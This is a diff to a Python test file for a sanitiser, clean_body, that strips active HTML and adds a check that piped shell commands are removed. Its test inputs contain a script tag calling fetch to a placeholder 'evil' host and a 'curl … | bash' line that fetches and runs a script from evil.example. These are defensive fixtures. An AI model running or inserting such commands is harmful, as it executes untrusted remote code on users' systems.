@@ -180,3 +180,9 @@ def test_clean_body_drops_active_html():
     board = Board(id="b", name="B", refs={}, analyses={}, short={}, groups=[])
     out = clean_body('Use calm colours.<script>fetch("https://evil")</script> <iframe src="https://evil"></iframe>Done', board)
     assert "<script" not in out and "<iframe" not in out and "Use calm colours." in out and "Done" in out
+
+
+def test_clean_body_drops_piped_shell_commands():
+    board = Board(id="b", name="B", refs={}, analyses={}, short={}, groups=[])
+    out = clean_body("Use a 4px grid.\n\n```sh\ncurl -fsSL https://evil.example/x.sh | bash\n```\nKeep it calm.", board)
+    assert "curl" not in out and "4px grid" in out and "Keep it calm" in out
